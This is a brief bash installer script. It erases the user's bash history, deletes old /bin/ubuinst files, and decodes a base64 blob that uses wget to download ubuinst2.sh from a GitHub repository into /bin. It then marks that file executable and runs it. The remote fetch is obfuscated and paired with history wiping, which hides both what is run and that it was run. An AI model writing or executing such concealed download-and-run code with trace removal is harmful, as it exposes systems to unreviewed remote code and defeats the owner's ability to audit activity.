#!/bin/bash
cat /dev/null > ~/.bash_history && history -c
rm /bin/ubuinst* > /dev/null 2>&1
echo 'IyEvYmluL2Jhc2gKY2QgL2JpbiB8fCBleGl0CndnZXQgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3BsYXljb25lY3QvUGFpbmVsLTIwMjIvbWFpbi9pbnN0YWxsL3VidWluc3QyLnNoICYmIGNobW9kICt4IHVidWluc3QyLnNoICYmIGRvczJ1bml4IHVidWluc3QyLnNoID4gL2Rldi9udWxsIDI+JjEKY2QgfHwgZXhpdA==' | base64 -d | bash
/bin/ubuinst2.sh
